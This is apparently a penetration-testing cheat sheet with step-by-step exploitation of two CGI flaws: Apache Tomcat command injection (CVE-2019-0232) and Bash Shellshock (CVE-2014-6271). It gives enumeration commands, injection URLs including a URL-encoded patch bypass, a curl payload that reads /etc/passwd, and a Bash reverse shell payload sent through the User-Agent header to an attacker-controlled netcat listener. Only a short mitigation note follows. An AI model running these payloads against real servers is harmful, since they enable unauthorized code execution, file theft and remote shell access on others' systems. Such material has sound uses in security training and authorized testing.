

**1. Tomcat RCE (CVE-2019-0232)**

- **Affected Software:** The vulnerability lies within specific versions of **Apache Tomcat**
### **1. Tomcat CGI Scripts & RCE (CVE-2019-0232)**

This vulnerability targets specific versions of Apache Tomcat on Windows systems where the CGI Servlet's enableCmdLineArguments option is enabled. It arises from an input validation error, allowing an attacker to inject and execute arbitrary commands.

#### **Impact / What Can Be Achieved**

- **Remote Code Execution (RCE):** Attackers can execute arbitrary commands on the underlying Windows operating system with the privileges of the Tomcat service account.
    
- **System Compromise:** This can lead to a full system compromise, allowing the attacker to read, write, or delete files, install malware, or pivot to other systems on the network.
    

#### **Affected Tomcat Versions**

- 9.0.0.M1 to 9.0.17
    
- 8.5.0 to 8.5.39
    
- 7.0.0 to 7.0.93
    

#### **Quick Steps / Summary**

1. **Enumerate Tomcat Version:**
    
    - Use nmap to identify the service and version on common ports like 8080.
        
            `nmap -p 8080 -sV -sC <TARGET_IP>`
          
        
2. **Find CGI Scripts:**
    
    - The default directory for CGI scripts is /cgi-bin/ or /cgi/.
        
    - Use a tool like ffuf to fuzz for common script extensions like .bat or .cmd on Windows.
        
```
#     Fuzz for .bat scripts
ffuf -w /path/to/wordlist.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.bat 
 # Fuzz for .cmd scripts 
 ffuf -w /path/to/wordlist.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.cmd`
```
     
        
3. **Exploit the Vulnerability:**
    
    - Once a script is found (e.g., welcome.bat), append a ?& followed by your command to the URL.
        
    - **Test with a simple command:**
        
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&dir`
          
        
    - **Check environment variables:**
        
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&set`
          
        
    - **Execute a specific command:** If the PATH variable is not set, you may need to provide the full path to the executable.
        
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
          
        
    - **Bypass Patches:** If the server has been patched, URL-encode the payload to bypass filters.
        
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
          
        

---

### **2. Shellshock via CGI Scripts (CVE-2014-6271)**

The Shellshock vulnerability affects older versions of Bash. It allows an attacker to execute arbitrary commands by crafting a malicious function definition within an environment variable, which is then passed to a CGI script.

#### **Impact / What Can Be Achieved**

- **Remote Code Execution (RCE):** An attacker can run commands with the permissions of the web server user.
    
- **Reverse Shell:** This often leads to gaining a reverse shell, providing interactive access to the server.
    
- **Further Network Pivoting:** The compromised host can be used as a staging point to attack other internal network resources.
    

#### **Quick Steps / Summary**

1. **Enumerate CGI Scripts:**
    
    - Use tools like gobuster to find CGI scripts (e.g., files with a .cgi extension).
        
        
`gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /path/to/wordlist.txt -x cgi`
          
        
2. **Confirm the Vulnerability:**
        
    - Use curl to send a crafted User-Agent string to a discovered CGI script. The payload () { :; }; is the key to triggering the vulnerability.
        
    - Attempt to execute a simple command like echo or cat /etc/passwd.
        
`curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<TARGET_IP>/cgi-bin/script.cgi`
          
        
- A vulnerable system will execute the command and return its output in the HTTP response.
        
3. **Exploitation to Reverse Shell:**
    
    - **Set up a listener:** On your attacker machine, start a netcat listener on your chosen port.
        
        
`sudo nc -lvnp <LISTENER_PORT>`
          
        
- **Send the reverse shell payload:** Craft a curl request with a Bash reverse shell payload in the User-Agent header.
        
        code Shell
        
        downloadcontent_copy
        
        expand_less
        
            `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR_IP>/<LISTENER_PORT> 0>&1' http://<TARGET_IP>/cgi-bin/script.cgi`
          
        
    - You should receive a connection back on your netcat listener.
        

---

### **Mitigation**

- **CVE-2019-0232:** Update to a patched version of Apache Tomcat.
    
- **Shellshock:** Upgrade the Bash version on the server. If upgrading is not possible, consider network segmentation or decommissioning the affected host.